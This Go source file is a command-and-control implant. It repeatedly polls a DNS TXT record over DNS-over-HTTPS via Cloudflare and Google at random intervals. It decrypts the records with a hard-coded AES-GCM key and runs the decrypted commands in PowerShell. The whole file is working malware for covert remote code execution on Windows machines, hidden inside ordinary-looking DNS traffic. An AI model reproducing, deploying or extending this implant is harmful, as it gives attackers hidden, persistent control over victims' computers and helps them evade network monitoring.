package main 

import (
    "github.com/likexian/doh-go"
	"github.com/likexian/doh-go/dns"
	"fmt"
	"context"
	"os/exec"
	"os"
	"math/rand"
	"time"
    "crypto/aes"
	"crypto/cipher"
	"strings"
	"encoding/json"
	"encoding/hex"
)

type cmdObj struct {
    CmdType string
    CmdContent string
	ClientName string
}

var nonce, _ = hex.DecodeString("29e11e1abbd52e10c5b537f6")
var key, _ = hex.DecodeString("b7df6e9682d3caeace0216e133e6eb533e0054e5bfbebdbe5eb1d59d6d266722")
var clientName = genClientName()
var previousCMD = ""

func genClientName() string {
	return ""
}
//decode to plaintext
func decInfo(ciphertext string) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Printf("%s\n", err.Error())
		return ""
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Printf("%s\n", err.Error())
		return ""
	}

	decode, _ := hex.DecodeString(ciphertext)

	plaintext, err := aesgcm.Open(nil, nonce, decode, nil)
	if err != nil {
		fmt.Printf("%s\n", err.Error())
		return ""
	}
	return string(plaintext)
}

//execute command within powershell
func runPSCmd(cmd_run string) { 
	cmd := &exec.Cmd {
        Path: cmd_run,
        Args: []string{"Powershell.exe", "-Command", cmd_run },
        Stdout: os.Stdout,
        Stderr: os.Stdout,
    }
    cmd.Start();
	cmd.Wait()
}
// specify what OS it is for, currently only for windows
func processCmd(cmd cmdObj) {
	switch cmd.CmdType {
		case "ps":
			runPSCmd(cmd.CmdContent)
	}
}


func DOHRequest() {
	// creating context to control execution of parrallel threads 
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	c := doh.Use(doh.CloudflareProvider, doh.GoogleProvider)

	rsp, err := c.Query(ctx, "domain.here", dns.TypeTXT)
	if err != nil {
		panic(err)
	}

	c.Close()

	// dns answer
	answer := rsp.Answer
	
	for _, a := range answer {
		info := decInfo(strings.Replace(a.Data, "\"", "", -1))
		if info != "" {
			var cmd cmdObj;
			json.Unmarshal([]byte(info), &cmd)
			// checks to see if client is valid and if command is same as previous before executing
			if (cmd.ClientName != "" || clientName == cmd.ClientName) && cmd.CmdContent != previousCMD {
				go processCmd(cmd)
				previousCMD = cmd.CmdContent
				fmt.Printf("Content: %s, Type: %s Name: %s\n", cmd.CmdContent, cmd.CmdType, cmd.ClientName)
			}
		}
	}
}

func main() {
	for {
		// waits between 1-10 seconds to look for a new payload to execute
		sleepDuration := rand.Intn(10-1)+1
		DOHRequest()
		fmt.Printf("Sleeping For: %v Seconds\n", sleepDuration)
		time.Sleep(time.Second*time.Duration(sleepDuration))
	}
}